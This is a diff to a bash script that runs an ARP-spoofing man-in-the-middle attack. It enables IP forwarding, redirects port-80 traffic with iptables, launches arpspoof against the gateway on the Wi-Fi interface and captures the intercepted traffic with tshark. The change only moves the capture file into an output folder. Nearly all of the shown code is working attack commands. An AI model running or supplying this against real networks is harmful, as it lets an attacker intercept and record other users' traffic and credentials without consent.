@@ -1,10 +1,16 @@
 #!/bin/bash
 
+#checking if output folder exists
+if  ! [[ -d "output" ]]
+then
+  mkdir output
+fi
+
 #creating a capture file for tshar 
-touch capture.pcap
+touch output/capture.pcap
 
 #changing permission so that tshark can read the file
-sudo chmod o=r+w capture.pcap
+sudo chmod o=r+w output/capture.pcap
 
 #getting ip info as string
 my_input=$(netstat -nr)
@@ -20,7 +26,6 @@ sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to
 
 #enabling ip forward
 echo "1" | sudo tee /proc/sys/net/ipv4/ip_forward
-
 #getting wifi interface
 wifi_interface=$(iw dev | awk '$1=="Interface"{print $2}')
 
@@ -35,10 +40,5 @@ sudo xterm -e zsh -c "arpspoof -i ${wifi_interface} ${ip_addr}" &
 #sudo tshark -i $wifi_interface -w capture.pcap > /dev/null 2>&1 &
 
 
-sudo xterm -e zsh -c "tshark -i ${wifi_interface} -w capture.pcap" &
-
-
-
-
-
+sudo xterm -e zsh -c "tshark -i ${wifi_interface} -w output/capture.pcap" &
 
